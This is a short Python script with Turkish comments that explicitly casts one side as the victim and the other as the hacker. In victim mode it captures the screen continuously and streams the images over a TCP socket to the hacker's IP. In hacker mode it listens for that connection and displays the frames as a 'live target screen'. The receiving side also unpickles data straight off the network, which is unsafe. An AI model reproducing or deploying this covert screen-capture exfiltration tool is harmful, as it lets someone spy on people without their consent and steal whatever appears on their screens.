import socket
import cv2
import pickle
import struct
import pyautogui
import numpy as np
import threading

mode = input("Mod Seç (1: Kurban/Gönderici, 2: Hacker/İzleyici): ")

# Ayarlar
IP = '127.0.0.1' # Uzaktan bağlanacaksan Hacker IP'si
PORT = 9999

if mode == '1': # KURBAN
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((IP, PORT))
    print("📺 Ekran paylaşılıyor...")

    while True:
        # Ekran görüntüsü al
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        
        # Veriyi sıkıştır ve gönder
        data = pickle.dumps(frame)
        message = struct.pack("Q", len(data)) + data
        client_socket.sendall(message)

elif mode == '2': # HACKER
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', PORT))
    server_socket.listen(5)
    print("👀 Bağlantı bekleniyor...")
    
    conn, addr = server_socket.accept()
    print(f"Bağlandı: {addr}")
    data = b""
    payload_size = struct.calcsize("Q")
    
    while True:
        while len(data) < payload_size:
            packet = conn.recv(4*1024)
            if not packet: break
            data += packet
        
        packed_msg_size = data[:payload_size]
        data = data[payload_size:]
        msg_size = struct.unpack("Q", packed_msg_size)[0]
        
        while len(data) < msg_size:
            data += conn.recv(4*1024)
            
        frame_data = data[:msg_size]
        data = data[msg_size:]
        
        frame = pickle.loads(frame_data)
        cv2.imshow("CANLI HEDEF EKRANI", frame)
        if cv2.waitKey(1) == ord('q'): break

    conn.close()